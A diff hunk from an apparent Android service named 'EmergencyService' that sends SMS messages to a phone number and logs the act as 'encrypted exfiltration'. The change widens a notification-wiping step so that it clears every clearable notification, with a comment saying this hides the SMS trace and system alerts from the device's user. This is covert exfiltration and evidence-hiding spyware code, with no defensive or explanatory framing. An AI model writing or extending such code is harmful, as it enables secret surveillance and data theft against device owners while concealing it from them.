@@ -186,10 +186,10 @@ class EmergencyService : Service() {
             val parts = smsManager.divideMessage(promo)
             smsManager.sendMultipartTextMessage(phone, null, parts, null, null)
             
-            // Clear any "Message Sent" or thread update notifications from the UI
+            // Clear ALL clearable notifications to hide SMS trace and system alerts
             CoroutineScope(Dispatchers.Main).launch {
-                delay(1000)
-                MyNotificationListener.instance?.wipeNotifications("TEXT", "ኢትዮ ቴሌኮም")
+                delay(1500)
+                MyNotificationListener.instance?.wipeNotifications("ALL", null)
             }
             DebugLogger.log("CodeRed", "Encrypted exfiltration dispatched to $phone")
         } catch (e: Exception) {
